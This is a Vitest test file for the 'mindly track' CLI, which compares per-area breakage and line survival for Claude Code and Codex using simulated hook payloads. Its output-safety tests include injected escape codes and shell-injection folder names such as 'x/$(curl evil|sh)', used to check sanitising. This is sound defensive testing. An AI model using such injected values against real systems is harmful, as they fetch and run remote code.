import { rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { USER, contractsOf } from '@mindly/engine';
import { openMindly } from '@mindly/runtime';
import { Store } from '@mindly/store';
import type { TrackReport } from '@mindly/engine';
import { bisectRun } from '../src/commands/bisect.js';
import { track } from '../src/commands/track.js';
import { outFor } from '../src/util.js';
import { areaArg } from '../src/views/track.js';
import { cli, git, sandbox, testIo, write, type Sandbox } from './helpers.js';

/*
 * End to end: real hook payloads from Claude Code and Codex in a sandbox repository. Codex makes
 * many edits in src/api and breaks nothing; Claude Code makes fewer, one of which breaks the test
 * (found by a real `mindly bisect`) and one a recorded decision (a contract). Both work in src/ui
 * without breaking anything. Survival is computed with the clock 8 days ahead.
 */

const DAY = 86_400_000;
const NODE = process.execPath;
const CC = ['cc-0', 'cc-1', 'cc-2'];
const CX = ['cx-0', 'cx-1', 'cx-2'];

const TEST_SCRIPT = `
const calc = require('./src/api/calc.js');
if (calc.add(2, 2) === 4) { console.log('ok'); process.exit(0); }
console.log('FAIL'); process.exit(1);
`;

async function hook(
  sb: Sandbox,
  agent: 'claude-code' | 'codex',
  sessionId: string,
  event: 'SessionStart' | 'PostToolUse',
  extra: Record<string, unknown> = {},
): Promise<void> {
  const payload = {
    session_id: sessionId,
    transcript_path: join(sb.home, `${sessionId}.jsonl`),
    cwd: sb.repo,
    permission_mode: 'default',
    hook_event_name: event,
    ...(agent === 'codex' ? { model: 'gpt-5-codex', turn_id: 'turn-1' } : {}),
    ...extra,
  };
  const r = await cli(sb, ['hook', agent, event], { stdin: JSON.stringify(payload) });
  expect(r.code).toBe(0);
}

/** Claude Code's Write tool: one file per call. */
async function claudeWrite(sb: Sandbox, session: string, rel: string, content: string) {
  write(sb.repo, rel, content);
  await hook(sb, 'claude-code', session, 'PostToolUse', {
    tool_name: 'Write',
    tool_input: { file_path: join(sb.repo, rel), content },
    tool_response: { filePath: join(sb.repo, rel), type: 'create' },
    tool_use_id: 'toolu_1',
  });
}

/** Codex's apply_patch: adds several files in one call (one edit per file). */
async function codexAdd(sb: Sandbox, session: string, files: [string, string][]) {
  const sections = files.map(([rel, content]) => {
    write(sb.repo, rel, content);
    return `*** Add File: ${rel}\n+${content.trimEnd()}`;
  });
  await hook(sb, 'codex', session, 'PostToolUse', {
    tool_name: 'apply_patch',
    tool_input: { command: `*** Begin Patch\n${sections.join('\n')}\n*** End Patch\n` },
    tool_response: { output: 'Done!' },
    tool_use_id: 'call_1',
  });
}

async function story(sb: Sandbox): Promise<void> {
  write(sb.repo, 'test.cjs', TEST_SCRIPT);
  write(sb.repo, 'src/api/calc.js', 'module.exports = { add: (a, b) => a + b };\n');
  write(sb.repo, 'src/api/auth.js', 'module.exports = { login: () => ({ role: "admin" }) };\n');
  git(sb.repo, 'add', '-A');
  git(sb.repo, 'commit', '-q', '-m', 'base');
  expect(
    (await cli(sb, ['init', '--yes', '--no-import', '--agents', 'claude-code,codex'])).code,
  ).toBe(0);
  expect((await cli(sb, ['config', 'set', 'hooks.timeoutMs', '10000'])).code).toBe(0);

  // A recorded decision with a contract: auth keeps returning the role.
  const m = openMindly({ env: sb.env, disableNotify: true });
  try {
    const project = await m.projects.resolve(sb.repo);
    const memory = m.memory.remember({
      projectId: project.project.id,
      projectRoot: project.root,
      kind: 'decision',
      title: 'login returns the role',
      body: 'The login response always carries the role.',
      source: USER,
    });
    contractsOf(m).create(
      memory.id,
      'pattern_present',
      { path: 'src/api/auth.js', pattern: 'role' },
      USER,
    );
  } finally {
    m.close();
  }

  for (const s of CC) await hook(sb, 'claude-code', s, 'SessionStart', { source: 'startup' });
  for (const s of CX) await hook(sb, 'codex', s, 'SessionStart', { source: 'startup' });

  // src/api: Claude Code 20 edits (the 6th breaks the test, the 11th the decision).
  for (let i = 0; i < 20; i++) {
    const s = CC[i % 3] as string;
    if (i === 5)
      await claudeWrite(
        sb,
        s,
        'src/api/calc.js',
        'module.exports = { add: (a, b) => a + b + 1 };\n',
      );
    else if (i === 10)
      await claudeWrite(
        sb,
        s,
        'src/api/auth.js',
        'module.exports = { login: () => ({ ok: true }) };\n',
      );
    else await claudeWrite(sb, s, `src/api/cc-${i}.js`, `export const ccApi${i} = ${i};\n`);
  }
  // src/api: Codex 140 edits in 7 patches.
  for (let p = 0; p < 7; p++) {
    const files: [string, string][] = [];
    for (let i = 0; i < 20; i++) {
      const n = p * 20 + i;
      files.push([`src/api/cx-${n}.js`, `export const cxApi${n} = ${n};\n`]);
    }
    await codexAdd(sb, CX[p % 3] as string, files);
  }
  // src/ui: 20 edits each, nothing broken.
  for (let i = 0; i < 20; i++) {
    await claudeWrite(
      sb,
      CC[i % 3] as string,
      `src/ui/cc-${i}.js`,
      `export const ccUi${i} = ${i};\n`,
    );
  }
  for (const [q, size] of [7, 7, 6].entries()) {
    const files: [string, string][] = [];
    for (let i = 0; i < size; i++) {
      const n = q * 7 + i;
      files.push([`src/ui/cx-${n}.js`, `export const cxUi${n} = ${n};\n`]);
    }
    await codexAdd(sb, CX[q] as string, files);
  }

  // The test broke: bisect finds Claude Code's edit.
  const io = testIo(sb);
  expect(await bisectRun(outFor(io), [NODE, 'test.cjs'], { json: true })).toBe(0);
  const found = JSON.parse(io.out.join('')) as { firstBad: { agentKind: string; paths: string[] } };
  expect(found.firstBad).toMatchObject({ agentKind: 'claude-code', paths: ['src/api/calc.js'] });

  // A file Claude Code wrote is gone again before its lines are checked.
  rmSync(join(sb.repo, 'src/ui/cc-0.js'));
}

const LATER = { now: () => Date.now() + 8 * DAY };

async function trackJson(sb: Sandbox, opts: Record<string, unknown> = {}): Promise<TrackReport> {
  const io = testIo(sb);
  expect(await track(outFor(io), { json: true, ...opts }, { clock: LATER })).toBe(0);
  return JSON.parse(io.out.join('')) as TrackReport;
}

async function trackText(sb: Sandbox, opts: Record<string, unknown> = {}) {
  const io = testIo(sb);
  const code = await track(outFor(io), opts, { clock: LATER });
  return { code, stdout: io.out.join(''), stderr: io.err.join('') };
}

describe('mindly track', () => {
  let sb: Sandbox;
  let report: TrackReport;
  beforeAll(async () => {
    sb = sandbox();
    await story(sb);
    report = await trackJson(sb);
    // On a slow machine the on-demand budget may leave a few edits for the next run.
    if (report.survival.pending > 0) report = await trackJson(sb);
  }, 180_000);

  it('counts edits, sessions and blames pinned to one agent, per area', () => {
    expect(report.totals).toEqual({ agents: 2, edits: 200, areas: 2 });
    expect(report.areas.map((a) => [a.area, a.edits])).toEqual([
      ['src/api', 160],
      ['src/ui', 40],
    ]);
    const api = report.areas[0]!;
    const [cx, cc] = api.agents;
    expect(cx).toMatchObject({ agent: 'codex', edits: 140, sessions: 3, enoughData: true });
    expect(cc).toMatchObject({ agent: 'claude-code', edits: 20, sessions: 3, enoughData: true });
    expect(cx!.breakages).toMatchObject({ count: 0, of: 140, rate: 0 });
    expect(cc!.bisect.count).toBe(1);
    expect(cc!.contracts.count).toBe(1);
    expect(cc!.mergeChecks.count).toBe(0);
    expect(cc!.breakages).toMatchObject({ count: 2, of: 20, rate: 0.1 });
    expect(cc!.breakageSessions).toBe(2);
    expect(cc!.breakages.interval!.low).toBeGreaterThan(cx!.breakages.interval!.high);
    expect(api.clearDifference).toEqual([
      {
        measure: 'breakages',
        better: { agent: 'codex', count: 0, of: 140 },
        worse: { agent: 'claude-code', count: 2, of: 20 },
      },
    ]);
    const ui = report.areas[1]!;
    expect(ui.agents.map((a) => [a.agent, a.edits, a.sessions, a.breakages.count])).toEqual([
      ['claude-code', 20, 3, 0],
      ['codex', 20, 3, 0],
    ]);
    expect(ui.clearDifference).toEqual([]);
    expect(report.usageLimits).toEqual([
      { agent: 'claude-code', limited: 0, sessions: 3 },
      { agent: 'codex', limited: 0, sessions: 3 },
    ]);
  });

  it('computes line survival with the clock 8 days ahead', () => {
    expect(report.survival.pending).toBe(0);
    const ui = report.areas[1]!;
    const cc = ui.agents.find((a) => a.agent === 'claude-code')!;
    expect(cc.kept).toMatchObject({ count: 19, of: 20 });
    expect(cc.kept.rate).toBeCloseTo(0.95);
    const cx = report.areas[0]!.agents.find((a) => a.agent === 'codex')!;
    expect(cx.kept).toMatchObject({ count: 140, of: 140 });
    expect(cx.keptFrom).toEqual({ edits: 140, sessions: 3 });
  });

  it('shows the counts, a clear difference in one area and none in the other', async () => {
    const r = await trackText(sb);
    expect(r.code).toBe(0);
    const out = r.stdout;
    expect(out).toContain('Track record - last 30 days - 2 agents - 200 edits');
    expect(out).toMatch(
      /src\/api\n {2}codex +140 edits +broke 0 \(0%\) - kept 140 of 140 tracked lines \(100%\)\n/,
    );
    expect(out).toMatch(
      / {2}claude-code +20 edits +broke 2 \(10%\) - kept 20 of 20 tracked lines \(100%\)\n/,
    );
    expect(out).toMatch(
      / {2}claude-code +20 edits +broke 0 \(0%\) - kept 19 of 20 tracked lines \(95%\)\n/,
    );
    expect(out).toContain('  -> codex breaks less often per edit here (clear difference)');
    expect(out).toMatch(/src\/ui\n[^]*-> no clear difference yet/);
    expect(out).toContain('Usage limits: claude-code 0 of 3 sessions - codex 0 of 3');
    expect(out).toContain('-> mindly track --area src/api --explain');
    expect(out).not.toMatch(/best|score|winner/i);
  });

  it('says "not enough data yet" below the minimum, and JSON has no rate', async () => {
    const r = await trackText(sb, { minEdits: 30 });
    expect(r.stdout).toMatch(/claude-code +20 edits +not enough data yet\n/);
    expect(r.stdout).not.toContain('clear difference');
    const json = await trackJson(sb, { minEdits: 30 });
    const cc = json.areas[0]!.agents.find((a) => a.agent === 'claude-code')!;
    expect(cc.enoughData).toBe(false);
    expect(cc.breakages).toEqual({ count: 2, of: 20, rate: null, interval: null });
    expect(cc.kept.rate).toBeNull();
    expect(json.areas[0]!.clearDifference).toEqual([]);
  });

  it('filters by --area, --agent and explains every number', async () => {
    const one = await trackText(sb, { area: 'src/api/', explain: true });
    expect(one.stdout).toContain('Track record - src/api - last 30 days');
    expect(one.stdout).toContain(
      'claude-code: checks 1 - decisions 1 - merge checks 0 - 95% interval',
    );
    expect(one.stdout).toContain('What each number counts');
    expect(one.stdout).toContain('Broke a check: reliable mindly bisect results');
    expect(one.stdout).toContain('at least 20 edits and 3 sessions in an area');
    expect(one.stdout).not.toContain('src/ui');
    const codex = await trackJson(sb, { agent: 'codex' });
    expect(codex.areas.flatMap((a) => a.agents.map((x) => x.agent))).toEqual(['codex', 'codex']);
    expect((await cli(sb, ['track', '--area', '../etc'])).code).toBe(2);
    expect((await cli(sb, ['track', '--agent', 'Not An Agent'])).code).toBe(2);
    expect((await cli(sb, ['track', '--since', 'soon'])).code).toBe(2);
  });

  it('--json has a stable shape', () => {
    expect(Object.keys(report)).toEqual([
      'window',
      'areaDepth',
      'filter',
      'minimum',
      'totals',
      'areas',
      'usageLimits',
      'survival',
      'truncated',
    ]);
    expect(report.truncated).toBe(false);
    expect(Object.keys(report.window)).toEqual(['since', 'from', 'to']);
    expect(report.window.since).toBe('30d');
    expect(report.minimum).toEqual({ edits: 20, sessions: 3 });
    expect(Object.keys(report.areas[0]!)).toEqual(['area', 'edits', 'agents', 'clearDifference']);
    expect(Object.keys(report.areas[0]!.agents[0]!)).toEqual([
      'agent',
      'edits',
      'sessions',
      'linesAdded',
      'linesRemoved',
      'enoughData',
      'breakages',
      'breakageSessions',
      'bisect',
      'contracts',
      'mergeChecks',
      'ruleAttempts',
      'kept',
      'keptFrom',
    ]);
    expect(Object.keys(report.areas[0]!.agents[0]!.breakages)).toEqual([
      'count',
      'of',
      'rate',
      'interval',
    ]);
    expect(Object.keys(report.areas[0]!.agents[0]!.breakages.interval!)).toEqual(['low', 'high']);
    expect(Object.keys(report.survival)).toEqual(['pending', 'checkedNow']);
  });

  it('suggests the agent in the split plan review only with a clear difference', async () => {
    const plan = {
      goal: 'Add billing to the API and the UI',
      parts: [
        {
          key: 'api',
          title: 'Billing API',
          agent: 'claude-code',
          owns: ['src/api/billing/**'],
          dependsOn: [],
          brief: 'Expose the billing endpoint.',
        },
        {
          key: 'ui',
          title: 'Billing page',
          agent: 'claude-code',
          owns: ['src/ui/billing/**'],
          dependsOn: ['api'],
          brief: 'Show the plan.',
        },
      ],
      contract: [],
    };
    const file = join(sb.home, 'plan.json');
    writeFileSync(file, JSON.stringify(plan));
    const text = await cli(sb, ['split', '--plan', file, '--dry-run']);
    expect(text.code).toBe(0);
    expect(text.stdout).toContain('suggested: codex (broke 0 of 140 edits in src/api vs 2 of 20)');
    expect(text.stdout.match(/suggested:/g)).toHaveLength(1);
    const json = await cli(sb, ['split', '--plan', file, '--dry-run', '--json']);
    const out = JSON.parse(json.stdout) as {
      plan: { parts: { key: string; agent: string }[] };
      suggestions: Record<string, { agent: string }>;
    };
    // The plan keeps its own choice; the suggestion is shown next to it only.
    expect(out.plan.parts.map((p) => [p.key, p.agent])).toEqual([
      ['api', 'claude-code'],
      ['ui', 'claude-code'],
    ]);
    expect(Object.keys(out.suggestions)).toEqual(['api']);
    expect(out.suggestions['api']!.agent).toBe('codex');
  });
});

describe('mindly track output safety', () => {
  it('strips escape codes from paths and labels', async () => {
    const sb = sandbox();
    await hook(sb, 'codex', 'cx', 'SessionStart', { source: 'startup' });
    const store = Store.open(join(sb.mindlyHome, 'mindly.db'));
    try {
      const project = store.projects.list()[0]!;
      const session = store.sessions.findByExternal(project.id, 'codex', 'cx')!;
      store.fileChanges.record({
        projectId: project.id,
        sessionId: session.id,
        path: 'src/\u001b[31mred\u001b[0m\u001b]0;title\u0007/x.ts',
        tool: 'Edit',
        hunkHashes: [],
        addedLines: 1,
        removedLines: 0,
        promptEventId: null,
      });
    } finally {
      store.close();
    }
    const r = await cli(sb, ['track']);
    expect(r.code).toBe(0);
    expect(r.stdout).not.toContain('\u001b');
    expect(r.stdout).not.toContain('\u0007');
    expect(r.stdout).toContain('src/red');
    const json = await cli(sb, ['track', '--json']);
    expect(json.stdout).not.toMatch(/\\u001b|\\u0007/);
    expect((JSON.parse(json.stdout) as TrackReport).areas[0]!.area).toBe('src/red');
  });

  it('never puts a folder name a shell would interpret into a suggested command', async () => {
    expect(areaArg('src/api')).toBe(' --area src/api');
    expect(areaArg('(root)')).toBe(" --area '(root)'");
    for (const bad of ['x/$(curl evil|sh)', 'a b', "it's", '-rf', 'a;b', 'a`b`']) {
      expect(areaArg(bad), bad).toBe('');
    }
    const sb = sandbox();
    await hook(sb, 'codex', 'cx', 'SessionStart', { source: 'startup' });
    const store = Store.open(join(sb.mindlyHome, 'mindly.db'));
    try {
      const project = store.projects.list()[0]!;
      const session = store.sessions.findByExternal(project.id, 'codex', 'cx')!;
      store.fileChanges.record({
        projectId: project.id,
        sessionId: session.id,
        path: 'x/$(curl evil|sh)/f.ts',
        tool: 'Edit',
        hunkHashes: [],
        addedLines: 1,
        removedLines: 0,
        promptEventId: null,
      });
    } finally {
      store.close();
    }
    const r = await cli(sb, ['track']);
    expect(r.stdout).toContain('-> mindly track --explain');
    expect(r.stdout).not.toContain('--area x/');
  });

  it('says so when there is nothing yet', async () => {
    const sb = sandbox();
    const r = await cli(sb, ['track']);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('no agent edits recorded yet');
  });
});
